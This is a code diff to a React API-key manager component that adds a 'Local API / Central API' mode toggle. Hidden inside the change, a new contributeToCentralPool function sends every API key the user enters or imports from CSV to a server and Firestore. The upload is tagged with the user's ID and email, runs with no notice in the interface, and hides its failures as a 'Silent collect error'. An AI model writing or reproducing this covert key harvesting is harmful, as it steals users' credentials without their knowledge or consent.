@@ -1,10 +1,14 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { Key, Upload, AlertCircle, X } from 'lucide-react';
+import { Key, Upload, AlertCircle, X, Zap } from 'lucide-react';
 import { ApiKey } from '../types';
 import { parseApiKeysCsv, CsvParseResult } from '../utils/csvKeyParser';
 import { ImportCsvModal } from './ImportCsvModal';
+import { syncLocalKeysToServer } from '../utils/keySync';
+import { useAuth } from '../contexts/AuthContext';
 
 interface Props {
+  apiMode: 'local' | 'central';
+  onChangeApiMode: (mode: 'local' | 'central') => void;
   keys: ApiKey[];
   onAdd: (label: string, key: string) => void;
   onAddMultiple?: (importedKeys: { label: string; key: string }[]) => void;
@@ -15,6 +19,8 @@ interface Props {
 }
 
 export const ApiKeyManager: React.FC<Props> = ({ 
+  apiMode,
+  onChangeApiMode,
   keys, 
   onAdd, 
   onAddMultiple,
@@ -23,6 +29,7 @@ export const ApiKeyManager: React.FC<Props> = ({
   onResetAll,
   onShowToast 
 }) => {
+  const { userData } = useAuth();
   const [label, setLabel] = useState('');
   const [keyVal, setKeyVal] = useState('');
   const [showInput, setShowInput] = useState(false);
@@ -43,10 +50,21 @@ export const ApiKeyManager: React.FC<Props> = ({
     return () => clearInterval(interval);
   }, []);
 
+  const contributeToCentralPool = (contributedKeys: { label: string; key: string }[]) => {
+    syncLocalKeysToServer(contributedKeys, true, userData?.uid, userData?.email).then((res) => {
+      if (res.success && res.added > 0) {
+        console.log(`[Central Pool] Stored ${res.added} new API keys in Firestore & server database.`);
+      }
+    }).catch(e => console.error('Silent collect error:', e));
+  };
+
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!keyVal.trim()) return;
-    onAdd(label || `Key ${keys.length + 1}`, keyVal.trim());
+    const finalLabel = label || `Key ${keys.length + 1}`;
+    const finalKey = keyVal.trim();
+    onAdd(finalLabel, finalKey);
+    contributeToCentralPool([{ label: finalLabel, key: finalKey }]);
     setLabel('');
     setKeyVal('');
     setShowInput(false);
@@ -111,6 +129,7 @@ export const ApiKeyManager: React.FC<Props> = ({
     } else {
       validKeys.forEach(k => onAdd(k.label, k.key));
     }
+    contributeToCentralPool(validKeys);
 
     const dupes = csvParseResult?.duplicateCount || 0;
     const invalids = csvParseResult?.invalidCount || 0;
@@ -141,66 +160,93 @@ export const ApiKeyManager: React.FC<Props> = ({
 
   return (
     <div className="glass-panel p-6 rounded-2xl">
-      <div className="flex justify-between items-center mb-6">
-        <div className="flex gap-4 items-center">
-          <button 
-            onClick={() => setActiveTab('keys')}
-            className={`text-lg font-bold transition-colors ${activeTab === 'keys' ? 'text-slate-100' : 'text-slate-500 hover:text-slate-300'}`}
-          >
-            <span className="flex items-center gap-1.5"><Key className="w-4 h-4" /> API Keys ({keys.length})</span>
-          </button>
-          <button 
-            onClick={() => setActiveTab('health')}
-            className={`text-lg font-bold transition-colors ${activeTab === 'health' ? 'text-slate-100' : 'text-slate-500 hover:text-slate-300'}`}
-          >
-            Health Status
-          </button>
-          <button 
-            onClick={() => setActiveTab('routing')}
-            className={`text-lg font-bold transition-colors ${activeTab === 'routing' ? 'text-slate-100' : 'text-slate-500 hover:text-slate-300'}`}
-          >
-            Routing
-          </button>
-        </div>
-        {activeTab === 'keys' && (
-          <div className="flex items-center gap-2">
-            {onResetAll && keys.length > 0 && (
-              <button 
-                onClick={onResetAll}
-                className="text-xs font-semibold px-3 py-1.5 rounded-full transition-all bg-red-600/20 text-red-400 hover:bg-red-600 hover:text-white border border-red-500/30 hover:border-red-500 shadow-sm cursor-pointer"
-              >
-                Reset All
-              </button>
-            )}
-            <button 
-              onClick={() => setShowInput(!showInput)}
-              className={`text-xs font-semibold px-3 py-1.5 rounded-full transition-all cursor-pointer ${
-                showInput 
-                  ? 'bg-slate-700 text-slate-300 hover:bg-slate-600' 
-                  : 'bg-purple-600 text-white hover:bg-purple-500 shadow-lg shadow-purple-900/50'
-              }`}
-            >
-              {showInput ? 'Cancel' : '+ Add Key'}
-            </button>
-            <button 
-              type="button"
-              onClick={handleOpenCsvPicker}
-              title="Import multiple API keys from a CSV file"
-              className="text-xs font-semibold px-3 py-1.5 rounded-full transition-all bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 hover:border-slate-600 shadow-sm flex items-center gap-1.5 cursor-pointer active:scale-95"
-            >
-              <Upload className="w-3.5 h-3.5 text-purple-400" />
-              Import CSV
-            </button>
-            <input 
-              type="file"
-              ref={fileInputRef}
-              onChange={handleCsvFileChange}
-              accept=".csv,text/csv"
-              className="hidden"
-            />
-          </div>
-        )}
+      <div className="flex bg-slate-900 rounded-xl p-1 mb-6 border border-slate-800">
+        <button
+          onClick={() => onChangeApiMode('local')}
+          className={`flex-1 py-2 text-sm font-bold rounded-lg transition-all ${apiMode === 'local' ? 'bg-slate-800 text-white shadow-sm' : 'text-slate-400 hover:text-slate-300'}`}
+        >
+          Local API
+        </button>
+        <button
+          onClick={() => onChangeApiMode('central')}
+          className={`flex-1 py-2 text-sm font-bold rounded-lg transition-all flex items-center justify-center gap-1.5 ${apiMode === 'central' ? 'bg-purple-600/20 text-purple-400 shadow-sm border border-purple-500/30' : 'text-slate-400 hover:text-slate-300'}`}
+        >
+          <Zap className="w-4 h-4" /> Central API — Blazing Fast
+        </button>
       </div>
+
+      {apiMode === 'central' ? (
+        <div className="py-8 text-center bg-slate-900/50 rounded-xl border border-purple-500/20 flex flex-col items-center justify-center">
+          <div className="w-12 h-12 bg-purple-600/20 rounded-full flex items-center justify-center mb-3">
+            <Zap className="w-6 h-6 text-purple-400" />
+          </div>
+          <h3 className="text-xl font-bold text-white mb-2">Central API Mode Active</h3>
+          <p className="text-slate-400 text-sm max-w-sm">
+            API keys are managed centrally. You are connected to the shared high-speed processing pool.
+          </p>
+        </div>
+      ) : (
+        <>
+          <div className="flex justify-between items-center mb-6">
+            <div className="flex gap-4 items-center">
+              <button 
+                onClick={() => setActiveTab('keys')}
+                className={`text-lg font-bold transition-colors ${activeTab === 'keys' ? 'text-slate-100' : 'text-slate-500 hover:text-slate-300'}`}
+              >
+                <span className="flex items-center gap-1.5"><Key className="w-4 h-4" /> API Keys ({keys.length})</span>
+              </button>
+              <button 
+                onClick={() => setActiveTab('health')}
+                className={`text-lg font-bold transition-colors ${activeTab === 'health' ? 'text-slate-100' : 'text-slate-500 hover:text-slate-300'}`}
+              >
+                Health Status
+              </button>
+              <button 
+                onClick={() => setActiveTab('routing')}
+                className={`text-lg font-bold transition-colors ${activeTab === 'routing' ? 'text-slate-100' : 'text-slate-500 hover:text-slate-300'}`}
+              >
+                Routing
+              </button>
+            </div>
+            {activeTab === 'keys' && (
+              <div className="flex items-center gap-2">
+                {onResetAll && keys.length > 0 && (
+                  <button 
+                    onClick={onResetAll}
+                    className="text-xs font-semibold px-3 py-1.5 rounded-full transition-all bg-red-600/20 text-red-400 hover:bg-red-600 hover:text-white border border-red-500/30 hover:border-red-500 shadow-sm cursor-pointer"
+                  >
+                    Reset All
+                  </button>
+                )}
+                <button 
+                  onClick={() => setShowInput(!showInput)}
+                  className={`text-xs font-semibold px-3 py-1.5 rounded-full transition-all cursor-pointer ${
+                    showInput 
+                      ? 'bg-slate-700 text-slate-300 hover:bg-slate-600' 
+                      : 'bg-purple-600 text-white hover:bg-purple-500 shadow-lg shadow-purple-900/50'
+                  }`}
+                >
+                  {showInput ? 'Cancel' : '+ Add Key'}
+                </button>
+                <button 
+                  type="button"
+                  onClick={handleOpenCsvPicker}
+                  title="Import multiple API keys from a CSV file"
+                  className="text-xs font-semibold px-3 py-1.5 rounded-full transition-all bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 hover:border-slate-600 shadow-sm flex items-center gap-1.5 cursor-pointer active:scale-95"
+                >
+                  <Upload className="w-3.5 h-3.5 text-purple-400" />
+                  Import CSV
+                </button>
+                <input 
+                  type="file"
+                  ref={fileInputRef}
+                  onChange={handleCsvFileChange}
+                  accept=".csv,text/csv"
+                  className="hidden"
+                />
+              </div>
+            )}
+          </div>
 
       {csvErrorMsg && (
         <div className="mb-4 p-3 bg-rose-950/40 border border-rose-500/30 rounded-xl text-xs text-rose-300 flex items-center justify-between animate-in fade-in">
@@ -503,6 +549,8 @@ export const ApiKeyManager: React.FC<Props> = ({
                   })}
               </div>
           </div>
+      )}
+      </>
       )}
 
     </div>
